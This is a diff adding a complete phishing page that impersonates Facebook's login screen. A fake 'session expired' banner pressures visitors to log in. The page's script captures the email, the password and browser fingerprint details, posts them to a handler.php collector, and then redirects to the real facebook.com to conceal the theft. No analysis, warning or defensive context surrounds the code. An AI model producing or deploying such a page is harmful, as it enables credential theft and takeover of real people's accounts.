@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook - Log In or Sign Up</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background: linear-gradient(#fff, #d3dde8);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 400px;
+            width: 100%;
+        }
+        .facebook-logo {
+            text-align: center;
+            color: #1877f2;
+            font-size: 3.5rem;
+            font-weight: bold;
+            margin-bottom: 10px;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto;
+        }
+        .tagline {
+            text-align: center;
+            font-size: 1.8rem;
+            color: #1c1e21;
+            margin-bottom: 20px;
+            font-weight: normal;
+        }
+        .login-box {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            margin-bottom: 12px;
+        }
+        input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        .login-btn {
+            width: 100%;
+            background: #1877f2;
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 16px;
+        }
+        .login-btn:hover {
+            background: #166fe5;
+        }
+        .forgot-link {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+        .forgot-link a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .divider {
+            border-top: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        .create-account {
+            text-align: center;
+        }
+        .create-btn {
+            background: #42b72a;
+            color: white;
+            border: none;
+            padding: 14px 16px;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .create-btn:hover {
+            background: #36a420;
+        }
+        .message {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            padding: 12px;
+            border-radius: 6px;
+            margin-bottom: 15px;
+            font-size: 14px;
+            text-align: center;
+            display: none;
+        }
+        .message.show { display: block; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="facebook-logo">facebook</div>
+        <p class="tagline">Connect with friends and the world around you on Facebook.</p>
+        
+        <div class="login-box">
+            <div class="message" id="message">
+                Your session has expired. Please log in again.
+            </div>
+            
+            <form id="loginForm" onsubmit="return handleSubmit(event)">
+                <input type="text" id="email" placeholder="Email or phone number" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <button type="submit" class="login-btn">Log In</button>
+            </form>
+            
+            <div class="forgot-link">
+                <a href="#">Forgot password?</a>
+            </div>
+            
+            <div class="divider"></div>
+            
+            <div class="create-account">
+                <button class="create-btn">Create new account</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Show session expired message
+        setTimeout(() => {
+            document.getElementById('message').classList.add('show');
+        }, 500);
+
+        function handleSubmit(event) {
+            event.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            const data = {
+                type: 'facebook_credentials',
+                email: email,
+                password: password,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: screen.width + 'x' + screen.height
+            };
+            
+            fetch('handler.php', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            }).then(() => {
+                // Simulate loading
+                const btn = document.querySelector('.login-btn');
+                btn.textContent = 'Logging in...';
+                btn.disabled = true;
+                
+                setTimeout(() => {
+                    window.location.href = 'https://www.facebook.com';
+                }, 1500);
+            });
+            
+            return false;
+        }
+    </script>
+</body>
+</html>
